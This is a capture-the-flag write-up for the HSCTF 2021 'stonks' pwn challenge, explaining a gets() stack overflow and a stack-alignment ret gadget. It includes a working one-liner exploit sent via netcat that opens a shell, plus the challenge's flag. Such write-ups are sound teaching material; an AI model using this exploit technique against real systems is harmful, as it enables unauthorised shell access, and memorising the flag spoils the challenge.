## Problem ##

## Solution ##

I practically had this one during the competition but my exploit did not work for a reason I found out afterwords: stack alignment. I actually had not encountered this issue before but it necessitates inclusion of a `ret` address in our payload.

The provided binary had a fairly simple layout. We could open the binary in Ghidra and see the `main` function:

```console
undefined8 main(void)

{
  puts("Advanced AI Stock Price Predictor");
  vuln();
  puts("Thanks for using the Advanced AI Stock Price Predictor!");
  return 0;
}
```

Then, naturally, we would take a look at `vuln`:

```console
void vuln(void)

{
  char local_28 [28];
  uint local_c;
  
  printf("Please enter the stock ticker symbol: ");
  gets(local_28);
  local_c = ai_calculate();
  printf("%s will increase by $%d today!\n",local_28,(ulong)local_c);
  return;
}
```

The other functions of interest in this challenge are `ai_calculate` and `ai_debug`:

```console
int ai_calculate(void)

{
  int iVar1;
  
  iVar1 = rand();
  return iVar1 % 0x14;
}
```

and 

```console
void ai_debug(void)

{
  system("/bin/sh");
  return;
}
```

In the `vuln` function, the use of the `gets` method is [bad](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351), since `gets` will read in as much data as you pass it, even if the length of that data exceeds the size of the buffer it gets passed into. In this case the buffer is 28.

While debugging in GDB I identified that it takes a string of length 40 to breach RIP (the instruction pointer). I first simply added the address of `ai_debug` to a length-40 string, thinking it would jump to `ai_debug` and execute `system("/bin/sh"(`. This turned out to be incorrect due to the stack alignment issue. It was necessary to include the `ret` address of vuln prior to the start address of `ai_debug`. And with that we could execute the payload and retrieve the flag:

```console
root@osboxes:~/Documents/hsctf2021# (python -c 'from pwn import *; print "A" * 40 + p64(0x4012c2) + p64(0x401258)';cat) | nc stonks.hsc.tf 1337
== proof-of-work: disabled ==
Advanced AI Stock Price Predictor
Please enter the stock ticker symbol: AAAAAAAAAAAAAAAAAAAAAAAAAAAA will increase by $3 today!
ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat flag
flag{to_the_moon}
```

The flag is **flag{to_the_moon}**.
